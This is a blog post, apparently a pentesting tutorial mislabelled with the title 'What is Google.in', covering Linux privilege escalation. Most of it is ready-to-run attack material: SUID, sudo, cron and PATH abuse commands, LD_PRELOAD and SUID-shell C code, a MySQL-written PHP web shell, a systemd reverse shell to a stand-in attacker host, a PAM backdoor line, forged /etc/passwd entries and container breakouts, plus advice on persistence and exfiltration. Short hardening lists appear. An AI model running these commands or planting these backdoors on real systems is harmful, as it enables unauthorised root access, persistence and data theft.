---
layout: post
title:  "What is Google.in"
date:   2025-09-29 12:00:00 +0000
categories: jekyll update
---

# Privilege Escalation in Linux: Real-World Tactics, Techniques & Procedures

<img src="https://raw.githubusercontent.com/CracksoftShlok/LinuxPrivEscResearch/refs/heads/main/LinPrivEsc.png" alt="Alt text" style="width: 100%; height: auto;" />

### Enumeration is Everything

Before attempting any exploitation, it's crucial to first understand the system you're working with. This process, known as enumeration, is essentially about gathering as much information as possible to assess the system's weaknesses. The primary objectives during enumeration include identifying the operating system and kernel version, as this can reveal known vulnerabilities associated with specific builds. You should also check for misconfigurations that could provide unintended access or escalate privileges. Additionally, it's important to look for outdated or vulnerable software, as well as any files or directories with weak permissions that could be abused. Finally, keep an eye out for secrets such as hardcoded passwords, sensitive configuration files, or leftover credentials, as these can be key entry points. In short, a thorough understanding of the target system is essential—because you can't exploit what you don't fully understand.

#### OS and Kernel Info
Check the Linux distro and version:
```
cat /etc/issue
cat /etc/*-release
uname -a
```
Why? Because certain exploits work only on specific versions. Also, some distros have custom hardening.

#### Environment Variables

```
env
cat ~/.bashrc
cat ~/.bash_profile
```
Why? You might find useful paths, custom scripts, or proxy settings. Also, these files often have secrets like passwords or tokens.

#### Check Running Services and Applications
##### Find Running Services
```
ps aux
netstat -tulpn
```
Why? To see what’s running and who owns those processes. Services running as **root** are high-value targets.

#### Installed Applications
```
dpkg -l       # Debian
rpm -qa       # Red Hat
ls -alh /usr/bin/
```
Why? Outdated applications = exploit opportunities.

#### Configuration Files
```
cat /etc/apache2/apache2.conf
cat /etc/mysql/my.cnf
```
Why? Misconfigured services may allow escalation or disclose credentials.

#### Scheduled Jobs (Cron)
```
crontab -l
cat /etc/crontab
ls -al /etc/cron*
```
Why? If a job runs as root and you can modify it (script path, environment), you might get root next time the job runs.

#### Credentials & Sensitive Data
##### Search for Passwords
```
grep -i pass *
find . -name "*.php" -exec grep -i "password" {} \;
```
Why? Developers often leave credentials in code, backups, configs, or logs. Use this to pivot or elevate privileges.

#### Network Info & Connectivity
```
ifconfig -a
netstat -antup
```
Why? Know the interfaces, IPs, open ports, and connections. Useful for pivoting or lateral movement.

#### Check for Sniffing or Tunnels
```
tcpdump
ssh -L / -R
proxychains
```
Why? See if you can capture traffic or tunnel data for exfil or control.

#### Users & Permissions
```
whoami
id
cat /etc/passwd
sudo -l
```
Why? Find who you are, who else is logged in, and who has what permissions. If a user can `sudo` something, game on.

#### Writable Locations and SUID/SGID Files
```
find / -perm -u=s -type f 2>/dev/null
find / -writable -type d
```
Why? SUID binaries run with the file owner's privileges – if that's root, it's an open door. Writable dirs let you drop malicious files/scripts.

#### Web Files & Logs
```
ls -alhR /var/www/
cat /var/log/auth.log
```
Why? Web apps often have hardcoded DB credentials. Logs might expose tokens or user actions.

#### Exploit the Box
After gathering all this, now:
- Look for known exploits (search kernel/app versions):
    - [Exploit-DB](https://www.exploit-db.com)
    - [Metasploit Modules](https://metasploit.com/modules)
    - [CVE Details](https://www.cvedetails.com)
- Compile locally if needed:
```
find / -name gcc*
```
Or upload precompiled payloads via `wget`, `nc`, `scp`, etc.

#### Tools to Automate Enumeration
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng)
- [unix-privesc-check](http://pentestmonkey.net/tools/unix-privesc-check)

#### Mitigations (Red Team Tips)

- Keep systems patched
- Minimize root-owned services
- Restrict cron jobs
- Audit for SUID/SGID and world-writable files
- Lock down sensitive config files
- Use tools like `Lynis` or `Bastille` to harden

### Privilege Escalation Techniques

#### **SUID (Set User ID) Binaries**
SUID binaries execute with the privileges of the file owner. If a SUID binary is misconfigured, it can be exploited to gain elevated privileges.

**Usage:**
- find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
- Check if any of these binaries can be exploited. For instance, if `/usr/bin/vim` has the SUID bit set: `vim -c ':!sh'`
- This command opens a shell with elevated privileges.

#### **Exploiting Sudo Rights**
If a user has sudo privileges, they can execute commands as another user, typically root. Misconfigured sudo permissions can be exploited.

**Usage:**
- List allowed sudo commands: `sudo -l`
- If a user can run a command like `sudo /bin/bash`, they can gain a root shell.

#### **Cron Jobs**
Scheduled tasks (cron jobs) running with elevated privileges can be exploited if they execute scripts or binaries that are writable by the current user.

**Usage:**

- List cron jobs: `ls -la /etc/cron*`
- If a cron job runs a script located at `/usr/local/bin/backup.sh`, and this script is writable, you can inject malicious commands into it.
#### **Kernel Exploits**
Outdated kernels may have known vulnerabilities that can be exploited to gain root access.

**Usage:**
- Check kernel version: `uname -r`
- Use tools like `linux-exploit-suggester` to identify potential exploits:
```
./linux-exploit-suggester.sh
```

#### **Weak File Permissions**
Files with sensitive information (like `/etc/shadow`) should not be readable by non-privileged users. If they are, passwords can be cracked offline.

**Usage:** 
- Check permissions: `ls -l /etc/shadow`
- If readable, extract hashes and use tools like `john` or `hashcat` to crack them.

#### **Environment Variables**
Scripts that execute other programs without specifying full paths can be exploited by manipulating the `PATH` environment variable

**Usage:**
- Create a malicious script: 
```
echo '/bin/sh' > /tmp/fake
chmod +x /tmp/fake
```
- Modify `PATH`:
```
export PATH=/tmp:$PATH
```

- When the vulnerable script runs, it may execute `/tmp/fake` instead of the intended binary.

#### **NFS (Network File System) Misconfigurations**
If an NFS share is mounted with the `no_root_squash` option, root privileges on the client can translate to root on the server.

**Usage:**
- Check NFS exports: `showmount -e target_ip`
- If `no_root_squash` is set, create a file with SUID bit on the share and execute it on the server.

#### **Exploiting Running Services**
Services running with elevated privileges may have vulnerabilities that can be exploited.

**Usage:**
- Identify services: `netstat -tuln`
- Check for known vulnerabilities in these services and exploit accordingly.

#### Tools for Privilege Escalation
- **LinPEAS:** Automated script for Linux privilege escalation enumeration.
- **GTFOBins:** Repository of Unix binaries that can be exploited by attackers.
- **Linux Exploit Suggester:** Suggests possible exploits based on kernel version.
- **pspy:** Monitors processes without requiring root permissions.

#### Mitigation Strategies
- Regularly update and patch systems.
- Audit SUID/SGID files and remove unnecessary ones.
- Restrict sudo permissions to essential commands.
- Secure cron jobs and scripts with proper permissions.
- Monitor and log user activities.
- Implement the principle of least privilege.

#### Capabilities Abuse (Linux Capabilities)
Linux capabilities allow binaries to perform privileged operations without needing full root access. However, improper capabilities assignment can be dangerous.

- **Check capabilities**: ``getcap -r / 2>/dev/null``
- **Common misconfigurations**:
```
# Allows network packet sniffing
/usr/bin/tcpdump = cap_net_raw+eip
```
- **Exploitation**:  If a binary has capabilities like `cap_setuid`, you can modify your UID mid-execution to escalate privileges.

#### Abusing NFS (Network File System) Shares

NFS shares may allow root-squash misconfigurations or allow execution with root privileges.
- **Mount NFS share**: `mount -o rw nfs-server:/share /mnt`
- **Exploit:** Create a binary as root on the share, then execute it from a system that doesn’t squash root.

#### Exploiting Misconfigured Services

##### a. **MySQL to Root**
If MySQL runs as root and allows local file writes:
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```
Then access `shell.php` from the browser with a command injection payload.

##### b. **Writable `systemd` Service**
```
ls -la /etc/systemd/system/
```
If a user can modify a service:
```
echo -e "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attackerip/4444 0>&1'" > /etc/systemd/system/pwn.service
systemctl daemon-reexec
systemctl start pwn
```

#### PATH Variable Exploitation

Poor scripting practices may invoke system binaries without full paths. If `PATH` is controlled, you can inject malicious binaries.
##### Example:
```
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash' > /tmp/ls
chmod +x /tmp/ls
```
If a script with root privileges calls `ls`, your version executes.

#### Exploiting `LD_PRELOAD`, `LD_LIBRARY_PATH`
Shared object injection using environment variables can be powerful when running scripts or binaries as root.
##### Example:
```
// evil.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
  system("chmod +s /bin/bash");
}
```

```
gcc -shared -fPIC evil.c -o evil.so
LD_PRELOAD=./evil.so <vulnerable-binary>
```

#### SSH Agent Hijacking

If an SSH agent is running and the socket is accessible, you can perform actions on behalf of the user.
```
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234
ssh-add -l
ssh user@host
```

#### Exploiting sudoedit (CVE-2021-3156)

Some sudo versions allow arbitrary heap-based buffer overflows.
- **Check version**: `sudo -V`
- **If vulnerable**, use public exploit scripts like [Baron Samedit](https://github.com/blasty/CVE-2021-3156).

#### Credential Harvesting
##### a. **Bash History**:
```
cat ~/.bash_history
```
##### b. **Config Files**:
Check for hardcoded passwords in:
```
~/.ssh/config
~/.git-credentials
/var/www/html/config.php
```

#### Post Exploitation: What to Do After Escalation
- Dump password hashes: `cat /etc/shadow`
- Install a backdoor or persistent shell.
- Exfiltrate sensitive files (but **only in legal pentesting scenarios**).
- Use `cron`, `rc.local`, or systemd for persistence.

#### Defenses & Hardening Tips

| Hardening Area                | Recommended Actions                                        |
| ----------------------------- | ---------------------------------------------------------- |
| **File Permissions**          | Enforce least privilege, avoid world-writable files        |
| **Patch Management**          | Regularly update kernel & software                         |
| **Logging & Auditing**        | Use `auditd`, `journald`, and centralized log monitoring   |
| **Disable Unused Services**   | Reduce attack surface                                      |
| **Secure Sudo Configuration** | Use `sudoers` with `NOPASSWD` only if absolutely necessary |
| **Container Security**        | Avoid running Docker containers as root unless required    |
#### Privilege Escalation Scripts & Frameworks

| Tool                                                                                   | Description                         |     |
| -------------------------------------------------------------------------------------- | ----------------------------------- | --- |
| **[LinPEAS](https://github.com/carlospolop/PEASS-ng)**                                 | Full-featured Linux enum script     |     |
| **[Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)** | Suggests kernel-level exploits      |     |
| **GTFOBins**                                                                           | Priv-escalation using Unix binaries |     |
| **[pSpy](https://github.com/DominicBreuker/pspy)**                                     | Process snooping without root       |     |
| **[LES](https://github.com/mzet-/linux-exploit-suggester)**                            | Lightweight exploit suggester       |     |

#### 16. Cron Job Misconfigurations
The `cron` daemon schedules tasks using `crontab`. Misconfigurations can lead to root privilege escalation.
##### a. Writable Script in Root Cron
If root runs a cron job with a user-writable script: 
```
ls -la /etc/cron.d/ /etc/cron.daily/
```
**Exploit**:  
Overwrite the script:
```
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /etc/cron.daily/backup
```

##### b. Wildcard Injection
When a cron job uses wildcards (`*`), an attacker can trick it.
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh shell.sh
```

#### Insecure SUID Binaries
Look for binaries with the **SUID** bit set:
```
find / -perm -4000 -type f 2>/dev/null
```
##### a. Exploit SUID Binary with GTFOBins:
Example: `/usr/bin/find`
```
find . -exec /bin/sh -p \; -quit
```
##### b. Custom SUID Wrapper
```
// suid-shell.c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
}
```
Compile, set SUID, and boom:
```
gcc suid-shell.c -o suid-shell
chmod +s suid-shell
```

#### Exploiting Polkit (CVE-2021-4034 “PwnKit”)
Affected systems with vulnerable `pkexec` can be rooted instantly.
- Check if vulnerable: `pkexec --version`
- Use publicly available exploit:
```
gcc pwnkit.c -o pwnkit
./pwnkit
```

#### Writable /etc/passwd or /etc/shadow
If `passwd` or `shadow` is writable (rare but critical misconfig):
```
openssl passwd -1 -salt hackpass yourpassword
```
Edit `/etc/passwd`:
```
root:$1$hackpass$yVx...:0:0:root:/root:/bin/bash
```

#### Kernel Exploits
Older or unpatched kernels are goldmines for privesc.
- Check version: `uname -a`
-  Use:
    - [Dirty COW (CVE-2016-5195)](https://github.com/dirtycow/dirtycow.github.io)
    - [Dirty Pipe (CVE-2022-0847)](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)
    - [OverlayFS Exploit](https://github.com/saghul/overlaysploit)
Always match your exploit to the exact kernel version.

#### Abusing Docker and LXD

##### a. Docker Breakout
If the user is in `docker` group:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
##### b. LXD Exploit
Add yourself to `lxd` group:
```
lxc init image-name my-container -c security.privileged=true
lxc config device add my-container mydevice disk source=/ path=/mnt/root recursive=true
lxc start my-container
lxc exec my-container bash
```

#### PAM Backdoor
Placing a malicious module in the PAM stack grants backdoor access.
Example (dangerous!):
```
echo 'auth required pam_exec.so quiet expose_authtok /usr/local/bin/backdoor.sh' >> /etc/pam.d/common-auth
```

#### SystemTap Kernel Module Injection
If you can run SystemTap scripts and load kernel modules:
```
stap -ve 'probe vfs.read { exec("/bin/bash"); exit(); }'
```
**Kernel module access = root compromise.**


### Real World Tips for Enumeration
- Use **pSpy** to see what's being executed
- Monitor `/proc/*/cmdline` for scripts and secrets
- Try `strace` and `lsof` on running processes
- Mount `procfs` in chrooted environments
- Always look for **setenv**, **system()**, and **exec()** in scripts.
